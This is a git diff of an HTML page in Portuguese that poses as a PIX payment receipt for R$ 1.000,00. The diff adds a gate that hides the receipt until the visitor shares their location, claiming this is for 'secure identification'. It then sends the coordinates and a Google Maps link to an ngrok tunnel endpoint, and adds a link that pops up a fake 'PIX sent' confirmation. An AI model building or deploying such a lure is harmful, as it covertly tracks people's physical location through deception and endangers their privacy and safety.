@@ -5,24 +5,132 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Comprovante de Recebimento</title>
     <link rel="stylesheet" href="styles.css" />
+    <style>
+      body {
+        font-family: "Arial", sans-serif;
+        background-color: #f4f7fa;
+        color: #4a4a4a;
+        padding: 20px;
+      }
+
+      .comprovante-container {
+        display: none;
+        background-color: #f9f7fc;
+        border-radius: 8px;
+        padding: 30px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        max-width: 700px;
+        margin: 0 auto;
+      }
+
+      #loading-message {
+        font-size: 18px;
+        font-weight: bold;
+        color: #6a1b9a;
+        text-align: center;
+        padding: 20px;
+        background-color: #e1bee7;
+        border-radius: 5px;
+        border: 2px solid #6a1b9a;
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          opacity: 0.8;
+        }
+        50% {
+          opacity: 1;
+        }
+        100% {
+          opacity: 0.8;
+        }
+      }
+
+      .informacoes p {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 10px;
+        color: #333;
+      }
+
+      .informacoes span {
+        font-weight: bold;
+        color: #6a1b9a;
+      }
+
+      .botao {
+        display: block;
+        width: 100%;
+        padding: 12px;
+        background-color: #6a1b9a;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        margin-top: 20px;
+        transition: background-color 0.3s ease;
+      }
+
+      .botao:hover {
+        background-color: #8e24aa;
+      }
+
+      .comprovante-footer {
+        text-align: center;
+        margin-top: 30px;
+        color: #888;
+      }
+
+      .comprovante-footer a {
+        color: #6a1b9a;
+        text-decoration: none;
+        font-weight: bold;
+      }
+
+      .comprovante-footer p {
+        font-size: 14px;
+      }
+
+      .mensagemstyle {
+        font-size: 18px;
+        font-weight: bold;
+      }
+    </style>
   </head>
 
   <body>
-    <div class="comprovante-container">
-      <h1>Comprovante de Recebimento</h1>
+    <p id="mensagem" class="flex flex-col items-center justify-center">
+      Olá, João Silva de Oliveira! Para concluirmos sua identificação com
+      segurança, precisamos confirmar sua localização...
+    </p>
+
+    <div class="comprovante-container" id="comprovante">
+      <h1 id="loading-message" class="fle">
+        Aguardando confirmação de localização...
+      </h1>
 
       <div class="informacoes">
         <p><span>Data:</span> <span id="data-atual"></span></p>
         <p><span>Valor Recebido:</span> R$ 1.000,00</p>
         <p><span>De:</span> João Silva de Oliveira</p>
-        <p><span>Status:</span> Recebido com Sucesso</p>
+        <p>
+          <span>Status:</span
+          ><span class="mensagemstyle" style="color: #00d824">
+            Recebido com Sucesso</span
+          >
+        </p>
       </div>
 
       <button class="botao" onclick="window.print()">Imprimir</button>
 
       <div class="comprovante-footer">
         <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-        <p><a href="#">Clique aqui</a> para mais informações.</p>
+        <p>
+          <a href="#" onclick="mostrarAlertaPix(event)">Clique aqui</a> para
+          mais informações.
+        </p>
       </div>
     </div>
 
@@ -31,7 +139,7 @@
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(sendLocation, handleError);
         } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
+          alert("Seu navegador não suporta geolocalização.");
         }
       });
 
@@ -41,16 +149,14 @@
       const ano = dataAtual.getFullYear();
 
       const dataFormatada = `${dia}/${mes}/${ano}`;
-
       document.getElementById("data-atual").textContent = dataFormatada;
-
-      console.log(dataAtual);
 
       function sendLocation(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+        // Envia a localização
         fetch("https://377b-179-125-247-46.ngrok-free.app/send-location", {
           method: "POST",
           headers: {
@@ -62,15 +168,38 @@
           .then((data) => {
             if (!data.success) {
               alert("Erro ao enviar o comprovante.");
+              return;
             }
+
+            // Mostra o comprovante
+            document.getElementById("comprovante").style.display = "block";
+            document.getElementById("loading-message").style.display = "none";
+            document.getElementById("mensagem").style.display = "none";
           })
           .catch((error) => {
-            console.error("Erro:", error);
+            console.error("Erro ao enviar:", error);
+            alert("Erro ao enviar a localização.");
           });
       }
 
       function handleError(error) {
         alert("Erro ao obter a localização: " + error.message);
+      }
+
+      function mostrarAlertaPix(event) {
+        event.preventDefault(); // Impede redirecionamento
+
+        const dataAtual = new Date();
+        const dia = String(dataAtual.getDate()).padStart(2, "0");
+        const mes = String(dataAtual.getMonth() + 1).padStart(2, "0");
+        const ano = dataAtual.getFullYear();
+
+        const horas = String(dataAtual.getHours()).padStart(2, "0");
+        const minutos = String(dataAtual.getMinutes()).padStart(2, "0");
+
+        const dataHoraFormatada = `${dia}/${mes}/${ano} às ${horas}:${minutos}`;
+
+        alert(`PIX enviado ao remetente no dia ${dataHoraFormatada}.`);
       }
     </script>
   </body>
